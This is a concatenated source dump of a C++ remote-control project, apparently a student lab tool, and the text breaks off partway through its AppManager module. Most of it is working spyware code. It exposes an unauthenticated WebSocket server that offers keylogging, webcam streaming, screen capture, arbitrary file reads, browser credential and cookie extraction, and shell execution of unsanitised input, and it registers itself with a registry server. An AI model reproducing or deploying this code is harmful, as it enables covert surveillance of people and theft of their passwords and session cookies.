/* ======================== ALL FILES TABLE OF CONTENTS ======================== */
/* This TOC lists files concatenated into this `all.txt`.                 */
/* - It was generated automatically and placed at the top of the file.    */
/* - To update the TOC, re-run the script or ask the assistant.          */
/* ========================================================================= */
/* Files included (in order): */
/* 1. ./CMakeLists.txt */
/* 2. ./CMakePresets.json */
/* 3. ./main.cpp */
/* 4. ./src/core/CommandDispatcher.hpp */
/* 5. ./src/interfaces/IRemoteModule.hpp */
/* 6. ./src/modules/AppManager.hpp */
/* 7. ./src/modules/AppManager_linux.cpp */
/* 8. ./src/modules/AppManager_win.cpp */
/* 9. ./src/modules/EdgeManager.hpp */
/* 10. ./src/modules/EdgeManager_linux.cpp */
/* 11. ./src/modules/EdgeManager_win.cpp */
/* 12. ./src/modules/encryption_utils.hpp */
/* 13. ./src/modules/FileManager.hpp */
/* 14. ./src/modules/FileManager_linux.cpp */
/* 15. ./src/modules/FileManager_win.cpp */
/* 16. ./src/modules/InputManager.hpp */
/* 17. ./src/modules/InputManager_linux.cpp */
/* 18. ./src/modules/InputManager_win.cpp */
/* 19. ./src/modules/KeyManager.hpp */
/* 20. ./src/modules/KeyManager_linux.cpp */
/* 21. ./src/modules/KeyManager_win.cpp */
/* 22. ./src/modules/ProcessManager.hpp */
/* 23. ./src/modules/ProcessManager_linux.cpp */
/* 24. ./src/modules/ProcessManager_win.cpp */
/* 25. ./src/modules/ScreenManager.hpp */
/* 26. ./src/modules/ScreenManager_linux.cpp */
/* 27. ./src/modules/ScreenManager_win.cpp */
/* 28. ./src/modules/SystemManager.hpp */
/* 29. ./src/modules/SystemManager_linux.cpp */
/* 30. ./src/modules/SystemManager_win.cpp */
/* 31. ./src/modules/WebcamManager.hpp */
/* 32. ./src/modules/WebcamManager_linux.cpp */
/* 33. ./src/modules/WebcamManager_win.cpp */
/* 34. registry_server/agents.js */
/* 35. registry_server/discovery.js */
/* 36. registry_server/server.js */
/*
    If you want a machine-parsable JSON TOC at the top instead, tell me
    and I will replace this block with a JSON object listing files and
    their byte offsets.
*/

/* ===== FILE: ./CMakeLists.txt ===== */
project(RemoteControlTool LANGUAGES C CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED ON)

# ------------------------------------------------------------------------------
# 1. CẤU HÌNH STATIC RUNTIME (QUAN TRỌNG ĐỂ KHÔNG CẦN CÁC FILE DLL HỆ THỐNG)
# ------------------------------------------------------------------------------
if(MSVC)
    # Ép sử dụng Static Runtime (/MT) cho cả Debug và Release
    set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
    add_compile_options($<$<CONFIG:Debug>:/MTd> $<$<CONFIG:Release>:/MT>)
    
    # Tắt các cảnh báo không cần thiết
    add_compile_definitions(_CRT_SECURE_NO_WARNINGS WIN32_LEAN_AND_MEAN)
endif()

# ------------------------------------------------------------------------------
# 2. TỰ ĐỘNG TẢI VÀ NHÚNG SQLITE (ĐỂ KHÔNG CẦN SQLITE3.DLL)
# ------------------------------------------------------------------------------
message(STATUS "Dang cau hinh SQLite3 che do Static (Embedded)...")

include(FetchContent)
FetchContent_Declare(
    sqlite3_src
    # Link tải mã nguồn "Amalgamation" (chỉ gồm 1 file .c và 1 file .h)
    URL https://www.sqlite.org/2024/sqlite-amalgamation-3450200.zip
    DOWNLOAD_EXTRACT_TIMESTAMP TRUE
)

FetchContent_MakeAvailable(sqlite3_src)

# Tạo thư viện tĩnh từ file source vừa tải về
# Lưu ý: Biến ${sqlite3_src_SOURCE_DIR} được tạo ra tự động bởi FetchContent
add_library(sqlite3_static STATIC "${sqlite3_src_SOURCE_DIR}/sqlite3.c")

# Cấu hình include folder
target_include_directories(sqlite3_static PUBLIC "${sqlite3_src_SOURCE_DIR}")

# Các định nghĩa cần thiết để SQLite chạy mượt trong môi trường đa luồng
target_compile_definitions(sqlite3_static PRIVATE 
    SQLITE_THREADSAFE=1 
    SQLITE_OMIT_LOAD_EXTENSION=1
)

if(MSVC)
    # Tắt cảnh báo khi compile code C của SQLite (để log sạch sẽ hơn)
    target_compile_options(sqlite3_static PRIVATE /W0)
endif()

# ------------------------------------------------------------------------------
# 3. CÁC THƯ VIỆN KHÁC
# ------------------------------------------------------------------------------
# Tìm nlohmann_json (Header only nên không lo về DLL)
find_package(nlohmann_json CONFIG REQUIRED)

# Cấu hình Boost Static (để không cần Boost DLL)
set(Boost_USE_STATIC_LIBS ON) 
find_package(Boost REQUIRED COMPONENTS system)

# Tìm OpenSSL (Cố gắng tìm static nếu có thể, nếu không bạn phải copy libcrypto/libssl.dll)
# Mẹo: Nếu vcpkg cài dynamic, bạn có thể cần copy 2 file dll của OpenSSL đi kèm.
find_package(OpenSSL REQUIRED)

if(WIN32)
    set(OS_SRCS
        src/modules/ProcessManager_win.cpp
        src/modules/SystemManager_win.cpp
        src/modules/ScreenManager_win.cpp
        src/modules/AppManager_win.cpp
        src/modules/KeyManager_win.cpp
        src/modules/WebcamManager_win.cpp
        src/modules/FileManager_win.cpp
        src/modules/InputManager_win.cpp
        src/modules/EdgeManager_win.cpp
    )
    # Các thư viện hệ thống Windows
    set(OS_LIBS ws2_32 user32 advapi32 shlwapi ole32 mf mfplat mfreadwrite mfuuid gdiplus crypt32 wininet)

# === [THÊM PHẦN NÀY CHO LINUX] ===
elseif(UNIX)
    set(OS_SRCS
        src/modules/ProcessManager_linux.cpp
        src/modules/SystemManager_linux.cpp
        src/modules/ScreenManager_linux.cpp
        src/modules/AppManager_linux.cpp
        src/modules/KeyManager_linux.cpp
        src/modules/WebcamManager_linux.cpp
        src/modules/FileManager_linux.cpp
        src/modules/InputManager_linux.cpp
        src/modules/EdgeManager_linux.cpp
    )
    
    # Thư viện Linux cần thiết
    # pthread: Cho đa luồng (std::thread)
    # dl: Cho dynamic loading
    # X11, Xtst: Thường cần cho ScreenManager (chụp màn hình) và InputManager (chuột/phím)
    
    find_package(JPEG REQUIRED) 
    set(OS_LIBS pthread dl X11 Xtst JPEG::JPEG)
endif()

# ------------------------------------------------------------------------------
# 5. TẠO FILE EXE VÀ LIÊN KẾT (LINKING)
# ------------------------------------------------------------------------------
add_executable(server main.cpp ${OS_SRCS})

target_include_directories(server PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/src)

target_link_libraries(server PRIVATE 
    sqlite3_static
    Boost::system 
    nlohmann_json::nlohmann_json 
    OpenSSL::Crypto
    OpenSSL::SSL
    ${OS_LIBS} # Biến này giờ sẽ chứa thư viện Windows hoặc Linux tùy môi trường
)


/* ===== FILE: ./CMakePresets.json ===== */

{
  "version": 3,
  "configurePresets": [
    {
      "name": "windows-vcpkg",
      "displayName": "Windows (Vcpkg x64)",
      "description": "Cấu hình cho Windows dùng Vcpkg ổ C",
      "generator": "Visual Studio 17 2022",
      "binaryDir": "${sourceDir}/build/win",
      "cacheVariables": {
        "CMAKE_TOOLCHAIN_FILE": "C:/dev/vcpkg/scripts/buildsystems/vcpkg.cmake",
        "VCPKG_TARGET_TRIPLET": "x64-windows",
        "CMAKE_EXPORT_COMPILE_COMMANDS": "ON"
      },
      "condition": {
        "type": "equals",
        "lhs": "${hostSystemName}",
        "rhs": "Windows"
      }
    },
    {
      "name": "linux-default",
      "displayName": "Linux (GCC/System Libs)",
      "description": "Cấu hình cho Linux dùng thư viện hệ thống (apt install)",
      "generator": "Unix Makefiles",
      "binaryDir": "${sourceDir}/build/linux",
      "cacheVariables": {
        "CMAKE_BUILD_TYPE": "Debug",
        "CMAKE_EXPORT_COMPILE_COMMANDS": "ON"
      },
      "condition": {
        "type": "equals",
        "lhs": "${hostSystemName}",
        "rhs": "Linux"
      }
    }
  ]
}


/* ===== FILE: ./main.cpp ===== */

// ==========================================
// FILE: main.cpp (Cross-Platform Version)
// ==========================================

// 1. Cấu hình định nghĩa cho Windows (Phải đặt trên cùng)
#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN // Giảm kích thước header Windows
    #endif
    #include <windows.h>      
#else
    #include <unistd.h>
    #include <limits.h>
    #include <netdb.h>        // Cho gethostname trên Linux
    #include <arpa/inet.h>    // Cho inet_ntoa
#endif

// 2. Các thư viện C++ chuẩn và Boost
#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/ip/udp.hpp> 
#include <boost/asio/ip/host_name.hpp>
#include <iostream>
#include <string>
#include <thread>
#include <mutex>
#include <vector>
#include <algorithm>
#include <nlohmann/json.hpp>

// 3. Include các module của dự án
#include "core/CommandDispatcher.hpp"
#include "interfaces/IRemoteModule.hpp"
#include "modules/KeyManager.hpp"
#include "modules/WebcamManager.hpp"
#include "modules/ScreenManager.hpp" 
#include "modules/ProcessManager.hpp"
#include "modules/FileManager.hpp"
#include "modules/EdgeManager.hpp" // THÊM DÒNG NÀY

#include <boost/beast/http.hpp>
#include <chrono>

namespace beast     = boost::beast;
namespace websocket = beast::websocket;
namespace net       = boost::asio;
using tcp           = net::ip::tcp;
using udp           = net::ip::udp;
using json          = nlohmann::json;
namespace http      = boost::beast::http;

// ==================== GLOBALS ====================
static std::mutex cout_mtx;
CommandDispatcher g_dispatcher;


// ==================== HELPER FUNCTIONS (Đa nền tảng) ====================

// Hàm lấy tên máy tính
std::string get_computer_name() {
#ifdef _WIN32
    char buf[256];
    DWORD size = sizeof(buf);
    if (GetComputerNameA(buf, &size)) {
        return std::string(buf);
    }
    return "UNKNOWN-WIN-PC";
#else
    char hostname[HOST_NAME_MAX];
    if (gethostname(hostname, HOST_NAME_MAX) == 0) {
        return std::string(hostname);
    }
    return "UNKNOWN-LINUX-PC";
#endif
}

// Hàm lấy IP LAN (Dùng Boost Asio để chạy trên mọi nền tảng)
std::string get_local_ip() {
    try {
        net::io_context io_context;
        udp::resolver resolver(io_context);
        
        // [FIX] Boost mới không dùng resolver::query nữa.
        // Thay vào đó, truyền tham số trực tiếp vào hàm resolve().
        auto endpoints = resolver.resolve(udp::v4(), "8.8.8.8", "80");
        
        if (endpoints.begin() != endpoints.end()) {
            udp::endpoint ep = *endpoints.begin();
            udp::socket socket(io_context);
            socket.connect(ep);
            return socket.local_endpoint().address().to_string();
        }
    } catch (...) {
        return "127.0.0.1";
    }
    return "127.0.0.1";
}

// Hàm lấy tên hệ điều hành
std::string get_os_name() {
#ifdef _WIN32
    return "Windows";
#elif __linux__
    return "Linux";
#else
    return "Unknown OS";
#endif
}

// ==================== SESSION MANAGER & LOGIC ====================
// Logic này giữ nguyên, chỉ đảm bảo include headers đúng

class SessionManager {
public:
    void join(websocket::stream<tcp::socket>* ws) {
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_.push_back(ws);
    }
    void leave(websocket::stream<tcp::socket>* ws) {
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_.erase(std::remove(sessions_.begin(), sessions_.end(), ws), sessions_.end());
    }
    void broadcast(const std::string& message) {
        std::lock_guard<std::mutex> lock(mutex_);
        for (auto* ws : sessions_) {
            try {
                // Kiểm tra socket còn mở trước khi gửi
                if(ws->is_open()) {
                    ws->text(true);
                    ws->write(net::buffer(message));
                }
            } catch (...) {}
        }
    }
private:
    std::vector<websocket::stream<tcp::socket>*> sessions_;
    std::mutex mutex_;
};
static SessionManager g_sessionManager;

void do_session(tcp::socket s) {
    auto ws = std::make_shared<websocket::stream<tcp::socket>>(std::move(s));
    auto ws_mutex = std::make_shared<std::mutex>();

    try {
        std::string client_ip = ws->next_layer().remote_endpoint().address().to_string();
        { std::lock_guard<std::mutex> lk(cout_mtx); std::cout << "[SESSION] CONNECTED: " << client_ip << "\n"; }

        ws->accept();
        g_sessionManager.join(ws.get());

        for (;;) {
            beast::flat_buffer buffer;
            ws->read(buffer);
            
            std::string req_str = beast::buffers_to_string(buffer.data());
            json request, response;

            try {
                request = json::parse(req_str);
                std::string module = request.value("module", "");
                std::string cmd = request.value("command", "");

                // --- MODULE: WEBCAM ---
                if (module == "WEBCAM") {
                    auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"));
                    if (cam) {
                        if (cmd == "START_STREAM") {
                            std::cout << "[MAIN] Webcam Stream Started\n";
                            cam->start_stream([ws, ws_mutex](const std::vector<uint8_t>& data) {
                                std::lock_guard<std::mutex> lock(*ws_mutex);
                                try {
                                    if(ws->is_open()) {
                                        ws->binary(true);
                                        ws->write(net::buffer(data.data(), data.size()));
                                    }
                                } catch (...) {}
                            });
                            response = {{"status", "success"}, {"message", "Stream Started"}};
                        } 
                        else if (cmd == "STOP_STREAM") {
                            cam->stop_stream();
                            response = {{"status", "success"}, {"message", "Stream Stopped"}};
                        }
                    }
                } 
                // --- MODULE: SCREENSHOT ---
                else if (module == "SCREEN" && cmd == "CAPTURE_BINARY") {
                    std::vector<uint8_t> jpg_data;
                    std::string err;
                    
                    bool should_save = true;

                    if (request.contains("payload") && request["payload"].contains("save")) {
                        should_save = request["payload"]["save"].get<bool>();
                    }   

                    if (ScreenManager::capture_screen_data(jpg_data, err, should_save)) {
                        {
                            std::lock_guard<std::mutex> lock(*ws_mutex);
                            ws->binary(true);
                            ws->write(net::buffer(jpg_data.data(), jpg_data.size()));
                        }
                        // Chỉ gửi phản hồi text nếu CÓ lưu file (để đỡ spam log client)
                        if (should_save) {
                            response = {{"module", "SCREEN"}, {"command", "CAPTURE_COMPLETE"}, {"status", "success"}};
                        } else {
                            // Khi stream thì không cần gửi JSON phản hồi, chỉ gửi ảnh là đủ
                            continue; 
                        }
                    } else {
                        response = {{"status", "error"}, {"message", err}};
                    }
                }
                // --- [MỚI] MODULE: FILE MANAGER ---
                else if (module == "FILE") {
                    if (cmd == "GET") {
                        // Xử lý gửi file nhị phân (Binary)
                        std::string filename = "";
                        if (request.contains("payload") && request["payload"].contains("name")) {
                            filename = request["payload"]["name"];
                        }

                        std::vector<uint8_t> file_data;
                        // Gọi hàm static từ FileManager
                        if (!filename.empty() && FileManager::read_file_binary(filename, file_data)) {
                            {
                                std::lock_guard<std::mutex> lock(*ws_mutex);
                                ws->binary(true); // Chuyển sang chế độ gửi Binary
                                ws->write(net::buffer(file_data.data(), file_data.size()));
                            }
                            // Thông báo JSON sau khi gửi file xong (Client có thể dùng hoặc bỏ qua)
                            response = {{"status", "success"}, {"command", "GET_COMPLETE"}, {"file", filename}};
                            std::cout << "[FILE] Sent: " << filename << "\n";
                        } else {
                            response = {{"status", "error"}, {"message", "File not found or empty name"}};
                        }
                    } else {
                        // Lệnh LIST xử lý qua Dispatcher (trả về JSON)
                        response = g_dispatcher.dispatch(request);
                    }
                }
                // --- [MỚI] MODULE: EDGE MANAGER ---
                else if (module == "EDGE") {
                    // Edge Manager xử lý qua Dispatcher
                    response = g_dispatcher.dispatch(request);
                    
                    // Log thông tin trích xuất
                    if (cmd == "GET_CREDENTIALS" && response.contains("count")) {
                        std::cout << "[EDGE] Extracted " << response["count"].get<int>() << " credentials\n";
                    }
                    else if (cmd == "GET_COOKIES" && response.contains("count")) {
                        std::cout << "[EDGE] Extracted " << response["count"].get<int>() << " cookies\n";
                    }
                    else if (cmd == "GET_ALL") {
                        int credCount = 0, cookieCount = 0;
                        if (response.contains("credentials") && response["credentials"].contains("count")) {
                            credCount = response["credentials"]["count"].get<int>();
                        }
                        if (response.contains("cookies") && response["cookies"].contains("count")) {
                            cookieCount = response["cookies"]["count"].get<int>();
                        }
                        std::cout << "[EDGE] Extracted " << credCount << " credentials and " << cookieCount << " cookies\n";
                    }
                }
                // --- OTHER MODULES ---
                else {
                    response = g_dispatcher.dispatch(request);
                }

            } catch (const std::exception& e) {
                response = {{"status", "error"}, {"message", e.what()}};
            }

            // Gửi phản hồi JSON (Text)
            {
                std::lock_guard<std::mutex> lock(*ws_mutex);
                ws->text(true);
                ws->write(net::buffer(response.dump()));
            }
        }

    } catch (const std::exception& e) {
        { std::lock_guard<std::mutex> lk(cout_mtx); std::cerr << "[SESSION END] " << e.what() << "\n"; }
        if (auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"))) {
            cam->stop_stream();
        }
    }
    g_sessionManager.leave(ws.get());
}

// ==================== REGISTRY & DISCOVERY (UDP) ====================
static std::string registry_host = "";

std::string udp_discover_registry() {
    try {
        net::io_context io;
        udp::socket socket(io);
        socket.open(udp::v4());
        socket.set_option(udp::socket::reuse_address(true));
        socket.set_option(net::socket_base::broadcast(true));
        socket.bind(udp::endpoint(udp::v4(), 0));

        udp::endpoint broadcast_ep(net::ip::address_v4::broadcast(), 8888);
        std::string msg = "DISCOVER_REGISTRY";
        socket.send_to(net::buffer(msg), broadcast_ep);

        char data[256] = {};
        udp::endpoint sender;
        
        socket.non_blocking(true); 
        
        // Thử nhận phản hồi trong 3 giây
        for (int i = 0; i < 30; i++) { 
            boost::system::error_code ec;
            size_t len = socket.receive_from(net::buffer(data), sender, 0, ec);
            
            if (!ec && len > 0) {
                std::string reply(data, len);
                if (reply.find("REGISTRY_IP:") == 0)
                    return reply.substr(12);
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Cross-platform sleep
        }
    } catch (...) {}
    return "";
}

void registerToRegistry() {
    try {
        net::io_context ctx;
        tcp::resolver resolver(ctx);
        beast::tcp_stream stream(ctx);

        auto const results = resolver.resolve(registry_host, "3000");
        stream.connect(results);

        json body = {
            {"machineId", get_computer_name()},
            {"ip", get_local_ip()},
            {"os", get_os_name()},
            {"wsPort", 9010},
            {"tags", json::array({"lab", "student"})}
        };

        http::request<http::string_body> req{ http::verb::post, "/api/agents/register", 11 };
        req.set(http::field::host, registry_host);
        req.set(http::field::content_type, "application/json");
        req.body() = body.dump();
        req.prepare_payload();

        http::write(stream, req);
        
        beast::flat_buffer buffer;
        http::response<http::string_body> res;
        http::read(stream, buffer, res);
        
        stream.socket().shutdown(tcp::socket::shutdown_both);
        std::cout << "[REGISTRY] Registered successfully to " << registry_host << "\n";
    } catch (const std::exception& e) {
        std::cout << "[REGISTRY] Register ERROR: " << e.what() << "\n";
    }
}

void sendHeartbeat() {
    try {
        net::io_context ctx;
        tcp::resolver resolver(ctx);
        beast::tcp_stream stream(ctx);

        auto const results = resolver.resolve(registry_host, "3000");
        stream.connect(results);

        json body = { {"machineId", get_computer_name()} };

        http::request<http::string_body> req{ http::verb::post, "/api/agents/heartbeat", 11 };
        req.set(http::field::host, registry_host);
        req.set(http::field::content_type, "application/json");
        req.body() = body.dump();
        req.prepare_payload();

        http::write(stream, req);
        
        beast::flat_buffer buffer;
        http::response<http::string_body> res;
        http::read(stream, buffer, res);
        
        stream.socket().shutdown(tcp::socket::shutdown_both);
    } catch (...) {}
}

// ==================== MAIN ====================
int main() {
    // [MỚI] Fix lỗi lệch chuột trên màn hình High DPI
    #ifdef _WIN32
        SetProcessDPIAware(); 
    #endif

    // Chỉ set font console trên Windows
    #ifdef _WIN32
    SetConsoleOutputCP(CP_UTF8);
    #endif

    std::cout << "=== REMOTE SERVER [" << get_os_name() << "] ===\n";

    g_dispatcher.register_module(std::make_unique<KeyManager>());
    
    // Keylogger Callback
    KeyManager::set_callback([&](std::string key_char) {
        json msg; 
        msg["module"] = "KEYBOARD"; 
        msg["command"] = "PRESS"; 
        msg["data"] = { {"key", key_char} };
        g_sessionManager.broadcast(msg.dump());
    });

    // 1. Tìm Registry Server
    std::cout << "[DISCOVERY] Searching for Registry...\n";
    registry_host = udp_discover_registry();

    if (registry_host.empty()) {
        std::cout << "[WARN] Registry NOT found. Standalone mode.\n";
    } else {
        std::cout << "[INFO] Found Registry at: " << registry_host << "\n";
        registerToRegistry();
        
        // Tạo thread heartbeat
        std::thread([]() {
            while (true) {
                sendHeartbeat();
                std::this_thread::sleep_for(std::chrono::seconds(10));
            }
        }).detach();
    }

    // 2. Mở Server WebSocket
    try {
        net::io_context ioc{1};
        tcp::acceptor acceptor{ioc, {net::ip::make_address("0.0.0.0"), 9010}};
        std::cout << "[SERVER] Listening on port 9010...\n";

        for (;;) {
            tcp::socket socket{ioc};
            acceptor.accept(socket);
            std::thread(do_session, std::move(socket)).detach();
        }
    } catch (const std::exception& e) {
        std::cerr << "[FATAL] " << e.what() << "\n";
    }
    return 0;
}


/* ===== FILE: ./src/core/CommandDispatcher.hpp ===== */

// #pragma once
// #include "../interfaces/IRemoteModule.hpp"
// #include <unordered_map>
// #include <memory>
// #include <string>
// #include <iostream>
// #include "../modules/ProcessManager.hpp"
// #include "../modules/SystemManager.hpp"
// #include "../modules/ScreenManager.hpp"
// #include "../modules/AppManager.hpp"
// #include "../modules/WebcamManager.hpp"
// #include "../modules/FileManager.hpp"
// #include "../modules/InputManager.hpp

// class CommandDispatcher {
// private:
//     std::unordered_map<std::string, std::unique_ptr<IRemoteModule>> modules_;

// public: 
//     CommandDispatcher() {
//         register_module(std::make_unique<ProcessManager>());
//         register_module(std::make_unique<SystemManager>());
//         register_module(std::make_unique<ScreenManager>());
//         register_module(std::make_unique<AppManager>());
//         register_module(std::make_unique<WebcamManager>());
//         register_module(std::make_unique<FileManager>());
//         register_module(std::make_unique<InputManager>())
//     }

//     void register_module(std::unique_ptr<IRemoteModule> module) {
//         if (!module) return;
//         const std::string name = module->get_module_name();
//         auto [it, inserted] = modules_.emplace(name, std::move(module));
//         if (inserted) std::cout << "Module registered: " << name << "\n";
//     }

//     // --- MỚI: Hàm lấy Module pointer để Main ép kiểu ---
//     IRemoteModule* get_module(const std::string& name) {
//         auto it = modules_.find(name);
//         if (it != modules_.end()) return it->second.get();
//         return nullptr;
//     }

//     json dispatch(const json& request) {
//         if (!request.contains("module")) return { {"status","error"},{"message","Missing module"} };
        
//         const std::string module_name = request["module"].get<std::string>();
//         auto it = modules_.find(module_name);
//         if (it == modules_.end()) return { {"status","error"},{"message","Unknown module"} };
        
//         return it->second->handle_command(request);
//     }
// };

#pragma once
#include "../interfaces/IRemoteModule.hpp"
#include <unordered_map>
#include <memory>
#include <string>
#include <iostream>
#include <nlohmann/json.hpp>

// Include các module
#include "../modules/ProcessManager.hpp"
#include "../modules/SystemManager.hpp"
#include "../modules/ScreenManager.hpp"
#include "../modules/AppManager.hpp"
#include "../modules/KeyManager.hpp"
#include "../modules/WebcamManager.hpp"
#include "../modules/FileManager.hpp"
#include "../modules/InputManager.hpp" // Nếu bạn đã làm phần Input Control
#include "../modules/EdgeManager.hpp"

using json = nlohmann::json;

class CommandDispatcher {
private:
    std::unordered_map<std::string, std::unique_ptr<IRemoteModule>> modules_;

public: 
    CommandDispatcher() {
        // Đăng ký các module
        register_module(std::make_unique<ProcessManager>());
        register_module(std::make_unique<SystemManager>());
        register_module(std::make_unique<ScreenManager>());
        register_module(std::make_unique<AppManager>());
        register_module(std::make_unique<KeyManager>());
        register_module(std::make_unique<WebcamManager>());
        register_module(std::make_unique<FileManager>());
        register_module(std::make_unique<InputManager>()); // Nếu chưa có file InputManager thì comment dòng này lại
        register_module(std::make_unique<EdgeManager>());
    }

    void register_module(std::unique_ptr<IRemoteModule> module) {
        if (!module) return;
        const std::string name = module->get_module_name();
        // Sửa lỗi C2001: Đảm bảo chuỗi không bị xuống dòng
        std::cout << "[INIT] Module registered: " << name << "\n";
        modules_.emplace(name, std::move(module));
    }

    // Hàm lấy module pointer (Để main gọi trực tiếp các hàm đặc biệt như Start Stream)
    IRemoteModule* get_module(const std::string& name) {
        auto it = modules_.find(name);
        if (it != modules_.end()) return it->second.get();
        return nullptr;
    }

    json dispatch(const json& request) {
        if (!request.contains("module")) return { {"status","error"},{"message","Missing module"} };
        
        // Sửa lỗi lấy string an toàn
        std::string module_name = request.value("module", "");
        
        auto it = modules_.find(module_name);
        if (it == modules_.end()) return { {"status","error"},{"message","Unknown module"} };
        
        return it->second->handle_command(request);
    }
};


/* ===== FILE: ./src/interfaces/IRemoteModule.hpp ===== */

// src/interfaces/IRemoteModule.hpp
#pragma once
#include <nlohmann/json.hpp>
#include <string>

using json = nlohmann::json;

class IRemoteModule {
public:
    virtual ~IRemoteModule() = default;
    
    // Phương thức xử lý lệnh: nhận JSON, xử lý, trả về JSON kết quả
    virtual json handle_command(const json& request) = 0;
    
    // Tên Module để Dispatcher phân loại (VD: "PROCESS")
    virtual const std::string& get_module_name() const = 0;
};


/* ===== FILE: ./src/modules/AppManager.hpp ===== */

// src/modules/AppManager.hpp
#pragma once
#include "../interfaces/IRemoteModule.hpp"
#include <string>
#include <vector>
#include <nlohmann/json.hpp>
#include <algorithm>
#include <cctype>

#if _WIN32
#include <windows.h>
#include <tlhelp32.h>
#else
#include <dirent.h> // for listing apps, processes
#include <unistd.h> // unix system api
#include <signal.h> // for killing apps, processes
#include <fstream> 
#include <wait.h> // wait for children processes
#endif

using nlohmann::json;

class AppManager : public IRemoteModule {
private:
    std::string module_name_ = "APP";

    // implement
    json list_apps();
    json kill_app_by_name(const std::string& exe_name);
    json start_app(const std::string& path_or_exe);

public:
    AppManager() = default;

    const std::string& get_module_name() const override {
        return module_name_;
    }

    json handle_command(const json& request) override;
};



/* ===== FILE: ./src/modules/AppManager_linux.cpp ===== */

#include "AppManager.hpp"

static std::string to_lower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(),
                   [](unsigned char c){ return std::tolower(c); });
    return s;
}

json AppManager::list_apps() {
    json app_list = json::array();

    DIR* proc_dir = opendir("/proc");
    if (!proc_dir) {
        return {
            {"status", "error"},
            {"module", get_module_name()},
            {"command", "LIST"},
            {"error", "Could not open /proc directory"}
        };
    }

    struct dirent* entry;
    while ((entry = readdir(proc_dir)) != NULL) {
        
        if (entry->d_type != DT_DIR) {
            continue;
        }

        const char* d_name = entry->d_name;
        bool is_pid = true;
        if (*d_name == '\0') is_pid = false; // Tên rỗng

        while (*d_name) {
            if (!std::isdigit(*d_name)) {
                is_pid = false;
                break;
            }
            d_name++;
        }

        if (is_pid) {
            std::string pid_str(entry->d_name);
            unsigned long pid = 0;
            unsigned long threads = 0;
            std::string name;

            try {
                pid = std::stoul(pid_str);
            } catch (...) {
                continue; // Bỏ qua nếu không phải số hợp lệ
            }

            std::ifstream comm_file("/proc/" + pid_str + "/comm");
            if (comm_file.is_open()) {
                std::getline(comm_file, name);
            } else {
                continue; 
            }

            std::ifstream status_file("/proc/" + pid_str + "/status");
            std::string line;
            if (status_file.is_open()) {
                while (std::getline(status_file, line)) {
                    // Tìm dòng bắt đầu bằng "Threads:"
                    if (line.rfind("Threads:", 0) == 0) {
                        std::stringstream ss(line);
                        std::string key; // Đọc chữ "Threads:"
                        ss >> key >> threads; // Đọc số lượng luồng
                        break;
                    }
                }
            }

            app_list.push_back({
                {"pid",     pid},
                {"name",    name} 
                // {"threads", threads}
            });
        }
    }

    closedir(proc_dir);

    return {
        {"status", "success"},
        {"module", get_module_name()},
        {"command", "LIST"},
        {"data", app_list}
    }; 
}

json AppManager::start_app(const std::string& app_name) { // Y như tạo một tiến  trình
    int pipe_fd[2];
    if (pipe(pipe_fd) == -1) {
        return {
            {"status", "error"}, 
            {"module", get_module_name()}, 
            {"action", "START"},
            {"error", "Failed to create pipe"} 
        };
    }

    pid_t pid = fork();

    if (pid == -1) {
        close(pipe_fd[0]);
        close(pipe_fd[1]);
        return {
            {"status", "error"}, 
            {"module", get_module_name()}, 
            {"action", "START"},
            {"error", "Fork failed"} 
        };
    }

    if (pid == 0) {
        close(pipe_fd[0]); // Con không đọc, đóng đầu đọc
        dup2(pipe_fd[1], STDOUT_FILENO); // Chuyển hướng stdout
        close(pipe_fd[1]); // Đóng fd gốc

        std::string command = app_name + " & echo $!";
        
        execl("/bin/sh", "sh", "-c", command.c_str(), (char*) NULL);
        
        _exit(errno); 
    }

    close(pipe_fd[1]); // Cha không viết, đóng đầu viết

    int status;
    waitpid(pid, &status, 0); 

    std::array<char, 32> buffer;
    std::string real_pid_str;
    ssize_t bytes_read = read(pipe_fd[0], buffer.data(), buffer.size() - 1);
    
    close(pipe_fd[0]); // Đọc xong, đóng đầu đọc

    unsigned long real_pid = 0;

    if (bytes_read > 0) {
        buffer[bytes_read] = '\0'; // Đảm bảo kết thúc chuỗi
        real_pid_str = buffer.data();
        
        real_pid_str.erase(
            std::remove(real_pid_str.begin(), real_pid_str.end(), '\n'), 
            real_pid_str.end()
        );

        try {
            real_pid = std::stoul(real_pid_str);
        } catch (...) {
             return {
                {"status", "error"}, 
                {"module", get_module_name()}, 
                {"action", "START"},
                {"error", "Failed to parse PID from child"}
            };
        }
    } else {
         return {
            {"status", "error"}, 
            {"module", get_module_name()}, 
            {"action", "START"},
            {"error", "Child process returned no PID"}
        };
    }

    return {
        {"status", "success"},
        {"module", get_module_name()},
        {"action", "START"},
        {"data", app_name}
    };

}

// json AppManager::kill_app_by_name(const std::string& app_name) {
// // Ngăn chặn các cuộc tấn công "command injection" cơ bản
//     // Chỉ cho phép tên ứng dụng an toàn (chữ, số, dấu gạch ngang)
//     std::string search_term = to_lower(app_name);
//     if (search_term.empty() || search_term.find_first_not_of("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-") != std::string::npos) {
//         return {
//             {"status", "error"},
//             {"module", get_module_name()},
//             {"action", "KILL"},
//             {"error", "Invalid application name"}
//         };
//     }
//
//     // Xây dựng lệnh: pkill -9 ten_ung_dung
//     // -9 là SIGKILL, tương đương với kill_pid_impl của chúng ta
//     std::string command = "pkill -9 " + app_name;
//
//     // Gọi lệnh hệ thống
//     int result = system(command.c_str());
//
//     if (result == 0) {
//         // pkill tìm thấy và đã kill thành công
//         return {
//             {"status", "success"},
//             {"module", get_module_name()},
//             {"action", "KILL"},
//             {"data", app_name}
//         };
//     }
